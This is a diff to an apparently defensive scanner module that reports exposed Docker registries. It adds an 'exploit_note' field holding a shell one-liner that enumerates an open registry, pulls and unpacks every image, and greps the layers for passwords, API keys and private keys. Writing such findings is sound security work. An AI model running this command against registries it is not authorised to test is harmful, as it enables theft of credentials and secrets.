@@ -118,10 +118,12 @@ def docker_registry_targets(hosts: list[Host]) -> list[dict]:
     return out
 
 
-def _finding(sev, title, target, detail, cmd, rem, cwes, kind=""):
+def _finding(sev, title, target, detail, cmd, rem, cwes, kind="",
+             exploit_note="", depth_tier=""):
     return {"severity": sev, "title": title, "target": target, "detail": detail,
             "tool": "docker", "command": cmd, "remediation": rem,
-            "cwes": cwes, "kind": kind}
+            "cwes": cwes, "kind": kind,
+            "exploit_note": exploit_note, "depth_tier": depth_tier}
 
 
 def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
@@ -154,7 +156,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "the registry to a private interface. If public registry "
                     "access is required, gate at least the write path.",
                     ["CWE-306", "CWE-284", "CWE-200"],
-                    kind="dockerreg_anonymous_catalog"))
+                    kind="dockerreg_anonymous_catalog",
+                    exploit_note=(
+                        "curl -sk http://<ip>:5000/v2/_catalog?n=1000; for r in "
+                        "<repos>; do docker pull <ip>:5000/$r:latest; docker save "
+                        "<ip>:5000/$r:latest | tar -xO | grep -Ei "
+                        "'password|api_key|BEGIN.*PRIVATE'; done"),
+                    depth_tier="t1"))
             elif pr.get("auth_required"):
                 out.append(_finding(
                     "info", "Docker Registry v2 reachable (auth required)", tgt,
